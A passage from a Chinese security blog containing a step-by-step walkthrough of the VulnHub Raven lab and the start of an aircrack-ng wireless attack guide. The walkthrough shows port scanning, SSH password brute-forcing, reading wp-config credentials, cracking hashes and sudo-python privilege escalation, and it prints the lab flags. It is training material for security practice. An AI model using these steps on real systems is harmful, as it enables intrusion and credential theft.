192.168.101.135</span><br></pre></td></tr></table></figure><blockquote><p>masscan：高速端口扫描工具。参数如下：</p><ul><li>-p:指定要扫描的端口范围，可以是单个端口如-p80,443或者多个端口-p1-65535</li><li>–rate:指定扫描速率，即每秒扫描多少个端口，默认速率10000</li><li>-iL：指定要扫描的IP地址列表，可以是一个文件，也可以是一个逗号分隔的IP地址列表</li><li>-oL：指定输出扫描结果的文件名，可以是一个文件，也可以是一个目录</li></ul></blockquote><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626142033498.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626142033498.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20230626142033498"></p><p>目标主机开启了80web服务端口，40695端口，111端口</p><ul><li><p>扫描目标端口服务</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -A -p- -sC -T4 -sS -P0 192.168.101.135 -oN nmap.A</span><br></pre></td></tr></table></figure><blockquote><ul><li>-A   使用操作系统检测、版本检测等选项</li><li>-p-   扫描目标主机所有端口(1-65535)</li><li>-sC   使用默认的Nmap脚本扫描</li><li>-T4  设置扫描速度为”快”</li><li>-sS   使用SYN扫描(半开放扫描)</li><li>-P0   禁用ping，不进行主机存活扫描</li><li>-oN nmap.A   将扫描结果输出到文件”nmap.A”中，格式为正常输出</li></ul></blockquote></li></ul><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626142129520.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626142129520.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20230626142129520"></p><ul><li>目标开启了以下端口及服务：<ul><li>22端口，服务为OpenSSH 6.7p1;且系统为Debian 5 +deb8u4</li><li>80端口，服务为Apacha 2.4.10</li><li>111端口，服务为rpcbind</li><li>40695端口，服务为rpc</li></ul></li></ul><p>使用Nmap中漏洞分类NSE脚本对目标进行探测</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV --script vuln 192.168.101.135</span><br></pre></td></tr></table></figure><hr><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626142416004.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626142416004.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20230626142416004"></p><p>可以看到有很多现成的CVE可以用</p><p>对网站进行指纹识别：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">whatweb 192.168.101.135</span><br></pre></td></tr></table></figure><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626142445620.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626142445620.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20230626142445620"></p><p>没有有效的web服务信息</p><p>在exploit-db上搜索ssh对应版本的漏洞，或者searchspolit，目标服务器的openssh有用户名枚举漏洞</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230625210618990.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230625210618990.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20230625210618990"></p><p>seebug上看到目标主机存在信息泄露和缓冲区溢出漏洞，还有2010年的拒绝服务漏洞（因该漏洞等级较低，实施拒绝服务也较困难所以无视）</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230625214035684.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230625214035684.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20230625214035684"></p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230625214249208.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230625214249208.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20230625214249208"></p><p>&#x3D;&#x3D;192.168.101.135主机的22端口存在信息泄露和缓冲区溢出漏洞，seebug还有searchspolit都能找到对应的poc，该轮信息扫描可以用来进行下一步的ssh爆破或溢出漏洞攻击。该信息泄露漏洞定义为中危&#x3D;&#x3D;</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230625214826294.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230625214826294.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20230625214826294"></p><p>访问其web服务：</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626142536853.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626142536853.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20230626142536853"></p><p>在其service.html源码里找到flag1:</p><p>&#x3D;&#x3D;flag1{b9bbcb33e11b80be759c4e844862482d}&#x3D;&#x3D;</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626151243145.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626151243145.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20230626151243145"></p><ul><li>目录扫描：</li></ul><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirb 192.168.101.135</span><br></pre></td></tr></table></figure><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626142852924.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626142852924.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20230626142852924"></p><p>目标网站存在vendor目录，访问一下，发现存在敏感目录遍历</p><blockquote><p>vendor目录一般是指在项目中用于存放第三方库、框架、插件等外部依赖的目录。</p></blockquote><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626143148450.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626143148450.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20230626143148450"></p><p>还有wordpress目录，该站应该是一个wordpress的框架</p><ul><li>wappalzer分析：</li></ul><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626143024979.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626143024979.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20230626143024979"></p><p>在目录可以看到使用了PGPMailer(功能齐全的PHP电子邮件创建和传输类)</p><p>VERSION目录找到了PHPMailer版本号为5.2.16</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626145333475.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626145333475.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20230626145333475"></p><p>进入到BLOG，看到wordpress网站后台登录入口：</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626151644306.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626151644306.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20230626151644306"></p><p>点击之后，会跳转到<code>http://raven.local/wordpress/wp-login.php</code>。但是无法连接到raven.local，考虑是dns解析错误。添加域名到hosts文件</p><ul><li>编辑hosts文件，使raven.local解析到靶机ip，写完之后清除一下dns缓存</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">192.168.101.135 raven.local</span><br></pre></td></tr></table></figure><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ipconfig /flushdns</span><br></pre></td></tr></table></figure><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626153057034.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626153057034.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20230626153057034"></p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626153223672.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626153223672.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20230626153223672"></p><h3 id="2-漏洞扫描"><a href="#2-漏洞扫描" class="headerlink" title="2. 漏洞扫描"></a>2. 漏洞扫描</h3><h4 id="WPscan工具"><a href="#WPscan工具" class="headerlink" title="WPscan工具"></a>WPscan工具</h4><p>用WPscan来探测WordPress的漏洞，暴力枚举用户名：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wpscan --url http://192.168.101.135/wordpress/ -eu</span><br></pre></td></tr></table></figure><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626153736259.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626153736259.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20230626153736259"></p><p>爆破到了两个用户名，分别是：<code>michael</code><code>steven</code></p><h4 id="hydra工具暴力破解"><a href="#hydra工具暴力破解" class="headerlink" title="hydra工具暴力破解"></a>hydra工具暴力破解</h4><p>把这两个用户名写入user.txt，用hydra进行密码爆破登录SSH:</p><p>kali本身有自带的密码字典：rockyou</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626154210867.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626154210867.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20230626154210867"></p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">gzip -d /usr/share/wordlists/rockyou.txt.gz</span><br><span class="line"><span class="built_in">cp</span> /usr/share/wordlists/rockyou.txt pass</span><br><span class="line">hydra -L user.txt -P pass 192.168.101.135 ssh</span><br></pre></td></tr></table></figure><p>ssh的用户michael密码为michael：</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626154904128.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626154904128.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20230626154904128"></p><h4 id="尝试进行ssh登录："><a href="#尝试进行ssh登录：" class="headerlink" title="尝试进行ssh登录："></a>尝试进行ssh登录：</h4><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh michael@192.168.101.135</span><br></pre></td></tr></table></figure><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626155252966.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626155252966.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20230626155252966"></p><p>ssh登录成功，获得低权限shell</p><h3 id="3-漏洞利用"><a href="#3-漏洞利用" class="headerlink" title="3. 漏洞利用"></a>3. 漏洞利用</h3><ul><li>find命令寻找flag2:</li></ul><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -name *flag* 2&gt;/dev/null</span><br></pre></td></tr></table></figure><blockquote><p>这个命令的作用是在Linux系统中查找文件名中包含“flag”字符串的文件，并将结果输出到控制台。</p><ul><li>从根目录查找</li><li><code>*</code>为通配符，表示文件名中含有flag字符串</li><li>2为错误输出，&#x2F;dev&#x2F;null特殊设备用于丢弃所有数据。<code>2&gt;/dev/null</code>表示忽略所有错误信息</li></ul></blockquote><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626155524561.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626155524561.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20230626155524561"></p><p>找到flag2:&#x3D;&#x3D;flag2{fc3fd58dcdad9ab23faca6e9a36e581c}&#x3D;&#x3D;</p><h4 id="登录Mysql"><a href="#登录Mysql" class="headerlink" title="登录Mysql"></a>登录Mysql</h4><p>查看Mysql是否在运行</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ps -ef | grep mysql</span><br></pre></td></tr></table></figure><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626160053324.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626160053324.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20230626160053324"></p><p>切换到wordpress目录，发现config配置文件：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /var/www/html/wordpress</span><br><span class="line"><span class="built_in">cat</span> wp-config.php</span><br></pre></td></tr></table></figure><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626160527025.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626160527025.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20230626160527025"></p><p>找到数据库账号root，密码R@v3nSecurity。Mysql登录</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql -u root -p</span><br></pre></td></tr></table></figure><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626160628125.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626160628125.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20230626160628125"></p><p>查看mysql数据库：</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626160758564.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626160758564.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20230626160758564"></p><p>获取数据库的flag3，flag4：</p><p>在wordpress.wp_posts里面找到了flag3和flag4</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626161015000.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626161015000.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20230626161015000"></p><p>&#x3D;&#x3D;flag3{afc01ab56b50591e7dccf93122770cd2}&#x3D;&#x3D;</p><p>&#x3D;&#x3D;flag4{715dea6c055b9fe3337544932f2941ce}&#x3D;&#x3D;</p><h4 id="数据库提权"><a href="#数据库提权" class="headerlink" title="数据库提权"></a>数据库提权</h4><p>在wordpress.wp_users里找到了两组数据库账号和密码</p><p>用户名分别为<code>michael</code>和<code>steven</code></p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626161341869.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626161341869.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20230626161341869"></p><p>密码加密后如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">michael:$P$BjRvZQ.VQcGZlDeiKToCQd.cPw5XCe0</span><br><span class="line">steven:$P$Bk3VD9jsxx/loJoqNsURgHiaB23j7W/</span><br></pre></td></tr></table></figure><ul><li>john解密：</li></ul><p>把上面<code>steven:$P$Bk3VD9jsxx/loJoqNsURgHiaB23j7W/</code>写进1.txt，使用john工具解密：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">john 1.txt --wordlist=/usr/share/wordlists/rockyou.txt</span><br></pre></td></tr></table></figure><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626162424167.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626162424167.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20230626162424167"></p><p>找到steven密码pink84</p><h4 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h4><p>使用<strong>python pty提权</strong></p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo python -c <span class="string">&#x27;import pty; pty.spawn(&quot;/bin/bash&quot;);&#x27;</span></span><br></pre></td></tr></table></figure><p>michael用户进行python提权时，由于michael用户没有被赋予sudo执行python的权限，所以提权失败，并且该事件还被记录了</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626162718424.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626162718424.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20230626162718424"></p><p>ssh登录steven之后再尝试提权：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ssh steven@192.168.101.135</span><br><span class="line">sudo python -c <span class="string">&#x27;import pty; pty.spawn(&quot;/bin/bash&quot;);&#x27;</span></span><br></pre></td></tr></table></figure><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626162930601.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626162930601.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20230626162930601"></p><p>steven是具有python sudo权限的，在sudoers里存在：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">steven ALL=(ALL) NOPASSWD: /usr/bin/python</span><br></pre></td></tr></table></figure><p>授予普通用户以root权限执行Python脚本（实战用不了一点）</p><p>用find命令或者直接找，在~目录下也能找到flag4</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626163116227.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626163116227.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20230626163116227"></p><p>本次渗透测试完毕</p>]]></content>
      
      
      <categories>
          
          <category> 内网渗透 </category>
          
          <category> 靶机 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 内网渗透 </tag>
            
            <tag> vulnhub </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>无线攻击之aircrack-ng</title>
      <link href="/2023/06/10/wu-xian-gong-ji-aircrack-ng/"/>
      <url>/2023/06/10/wu-xian-gong-ji-aircrack-ng/</url>
      
        <content type="html"><![CDATA[<h1 id="无线攻击之aircrack-ng套件"><a href="#无线攻击之aircrack-ng套件" class="headerlink" title="无线攻击之aircrack-ng套件"></a>无线攻击之aircrack-ng套件</h1><h2 id="一、aircrack-ng简介"><a href="#一、aircrack-ng简介" class="headerlink" title="一、aircrack-ng简介"></a>一、aircrack-ng简介</h2><p>Aircrack- ng 是一个完整的工具套件，以评估 WiFi 网络的安全性。它着重于WiFi 安全的不同领域： </p><p>监视：数据包捕获并将数据导出到文本文件，以供第三方工具进行进一步处理 </p><p>攻击：通过数据包注入来重放攻击，取消身份验证，伪造的接入点和其他攻击 </p><p>测试：检查 WiFi 卡和驱动程序功能（捕获和注入） </p><p>破解：WEP 和 WPA PSK（WPA 1 和 2） </p><p>所有工具都是命令行，允许进行大量脚本编写。许多 GUI 都利用了此功能。它主要适用于 Linux。 </p><h2 id="二、aircrack-ng常用工具介绍"><a href="#二、aircrack-ng常用工具介绍" class="headerlink" title="二、aircrack-ng常用工具介绍"></a>二、aircrack-ng常用工具介绍</h2><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/wps47.jpg" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/wps47.jpg" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="img"> </p><h3 id="（一）-Airbase-ng"><a href="#（一）-Airbase-ng" class="headerlink" title="（一） Airbase-ng"></a>（一） Airbase-ng</h3><p>Airbase-ng 是多功能工具，实现的主要思想是，旨在攻击客户端，鼓励客户端与伪造的 AP 关联，而不是阻止他们访问真实的 AP。主要功能有：  </p><p>实施 Caffe Latte WEP 客户端攻击  </p><p>实施 Hirte WEP 客户端攻击  </p><p>能够捕获 WPA &#x2F; WPA2 握手的能力 </p><p>可以充当临时访问点 </p><p>能够充当完整的接入点 </p><p>能够按 SSID 或客户端 MAC 地址进行过滤 </p><p>能够处理和重新发送数据包 </p><p>能够加密发送的数据包和解密接收的数据包 </p><h4 id="1、-语法格式"><a href="#1、-语法格式" class="headerlink" title="1、 语法格式"></a>1、 语法格式</h4><p>【语法】airbase-ng &lt;option&gt; </p><p>Option： </p><p>-a bssid：设置接入点 MAC 地址 </p><p>-i iface：从此接口捕获数据包 </p><p>-w WEP key：使用此 WEP 密钥加密 &#x2F; 解密数据包 </p><p>-h MAC：用于 MITM 模式的源 mac </p><p>-f disallow：禁止指定的客户端 MAC（默认值：允许） </p><p>-W 0 | 1：[不] 在信标 0 | 1 中设置 WEP 标志（默认：自动） </p><p>-q：安静（不打印统计信息） </p><p>-v：详细（打印更多消息）（长–详细） </p><p>-M：[指定的] 客户端和 bssids 之间的 MITM（当前未实现） </p><p>-A：点对点模式 (允许其他客户端对等)(Long–点对点)。 </p><p>-Y in | out |Both：外部数据包处理 </p><p>-c channel：设置 AP 运行的通道 </p><p>-X：隐藏的 ESSID（长–隐藏） </p><p>-s：强制共享密钥认证 </p><p>-S：设置共享密钥挑战长度（默认值：128） </p><p>-L：Caffe-Latte 攻击（长– 拿铁咖啡） </p><p>-N：Hirte 攻击（cfrag 攻击），针对 wep 客户端创建 arp 请求（long -cfrag）-x nbpps：每秒的数据包数（默认值：100） </p><p>-y：禁用对广播探测的响应 </p><p>-0：设置所有 WPA，WEP，打开标签。不能与 - z 和 - Z 一起使用 </p><p>-z type：设置 WPA1 标签。1 &#x3D; WEP40 2 &#x3D; TKIP 3 &#x3D; WRAP 4 &#x3D; CCMP 5 &#x3D; WEP104 </p><p>-Z type :：与 - z 相同，但适用于 WPA2 </p><p>-V type :：假 EAPOL 1 &#x3D; MD5 2 &#x3D; SHA1 3 &#x3D; 自动 </p><p>-F prefix：将所有已发送和已接收的帧写入 pcap 文件 </p><p>-P：即使指定 ESSID，也响应所有探测 </p><p>-I interval：以毫秒为单位设置信标间隔值 </p><p>-C 秒：启用信标探测的 ESSID 值（需要 - P） </p><p>过滤器选项： </p><p>-bssid ：要筛选 &#x2F; 使用的 bssid (简称 - b) </p><p>-bssids ：从该文件读取 BSSID 列表 (j-B) </p><p>-client ：客户端的 MAC 接受（短 - d） </p><p>-clients ：从该文件中读取 Mac 列表 (（短 - D） </p><p>-essid ：指定单个 ESSID（短 - e） </p><p>-essids ：从该文件中读取 ESSID 列表 (短 - E) </p><h4 id="2、-使用示例"><a href="#2、-使用示例" class="headerlink" title="2、 使用示例"></a>2、 使用示例</h4><p>（1）airbase-ng -c 9 -e WiFiClass -N -W 1 wlan0 </p><p>-c 9 指定通道 </p><p>-e teddy 过滤单个 SSID </p><p>-N 指定 Hirte 攻击 </p><p>-W 1 强制信标指定 WEP </p><p>rausb0 指定要使用的无线接口 </p><p>（2）捕获 WPA 握手包 </p><p>airbase-ng -c 9 -e WiFiClass -z 2 -W 1 wlan0 </p><p>-c 9 指定通道 </p><p>-e teddy 过滤单个 SSID </p><p>-z 2 指定 TKIP </p><p>-W 1 设置 WEP 标志，因为有些客户机没有它。rausb0 指定要使用的无线接口 </p><p>必须根据客户端使用的密码来更改 - z 类型。TKIP 是 WPA 的典型代表。 </p><h3 id="（二）-Airmon-ng"><a href="#（二）-Airmon-ng" class="headerlink" title="（二） Airmon-ng"></a>（二） Airmon-ng</h3><p>可用于在无线接口上启用监视模式。它也可以用于从监视模式返回到托管模式。输入不带参数的 airmon-ng 命令将显示接口状态。<img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/wps48.jpg" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/wps48.jpg" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="img"></p><h4 id="1、语法格式"><a href="#1、语法格式" class="headerlink" title="1、语法格式"></a>1、语法格式</h4><p>【语法 1】airmon-ng &lt;start|stop&gt; &lt;interface&gt; [channel] </p><p>【语法 2】airmon-ng &lt;check&gt; [kill] </p><p>start|stop：启动或停止监听模式 </p><p>interface：监听接口 </p><p>channel：监听信道 </p><p>check：列出所有可能干扰无线网卡的程序 </p><p>kill：结束所有可能干扰无线网卡的进程 </p><h4 id="2、使用示例"><a href="#2、使用示例" class="headerlink" title="2、使用示例"></a>2、使用示例</h4><p>（1）列出所干扰无线网卡工作程序、结束所有干扰进程</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/wps49.jpg" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/wps49.jpg" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="img"> </p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/wps50.jpg" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/wps50.jpg" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="img"> </p><p>注意：kill 后，网络管理器进程将被结束，若需要重新启用，则使用命令： </p><p>systemctl enable –now NetworkManager</p><p>（2）启用监听模式</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/wps51.jpg" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/wps51.jpg" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="img"> </p><p>（3）停用监听模式 </p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/wps52.jpg" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/wps52.jpg" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="img"> </p><h3 id="（三）-Airodump-ng"><a href="#（三）-Airodump-ng" class="headerlink" title="（三） Airodump-ng"></a>（三） Airodump-ng</h3><p>Airodump-ng 用于原始 802.11 帧的数据包捕获，尤其适用于收集 WEP IV（初始化矢量），以用于将其与 aircrack-ng 一起使用 </p><h4 id="1、语法格式-1"><a href="#1、语法格式-1" class="headerlink" title="1、语法格式"></a>1、语法格式</h4><p>【语法】airodump-ng &lt;options&gt; &lt;interface&gt;[,&lt;interface&gt;,…] </p><p>Option： </p><p>-H，–help：打印帮助信息界面 </p><p>-i，–ivs：只保存 IVs(只对破解有用).如果指定了此选项，则必须提供转储前缀(–write 选项) </p><p>-g,–gpsd：指示 airodump-ng 应该尝试使用 GPSd 获取坐标。 </p><p>-w &lt;prefix&gt;,–write &lt;prefix&gt;：要使用的转储文件前缀。如果没有提供这个选项，它将只在屏幕上显示数据。在该文件旁边将创建与捕获文件相同文件名的 CSV 文件 </p><p>-e,–beacons：它将记录所有的信标到 cap 文件。默认情况下，它只记录每个网络的一个信标 </p><p>-u &lt;secs&gt;,–update &lt;secs&gt;：延迟&lt;秒&gt;显示更新之间的延迟(默认为 1 秒)。适用于 CPU 速度慢的情况。 </p><p>-showack：打印 ACK &#x2F; CTS &#x2F; RTS 